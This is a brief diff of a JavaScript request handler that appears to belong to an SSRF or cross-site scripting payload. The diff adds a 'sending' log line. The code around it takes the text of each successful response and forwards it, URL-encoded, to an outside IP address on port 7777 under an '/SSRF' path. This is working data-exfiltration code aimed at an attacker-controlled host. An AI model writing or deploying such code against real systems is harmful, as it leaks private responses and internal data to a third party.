@@ -3,6 +3,7 @@ function handler() {
   console.log(1);
   console.log(this);
   if(this.status == 200 && this.responseText != null) {
+      console.log("sending");
       //xhr2.onreadystatechange = none; 
       var xhr2 = new XMLHttpRequest();
       xhr2.open("GET", 'http://192.241.169.35:7777/SSRF?u='+encodeURIComponent(this.responseText), true);
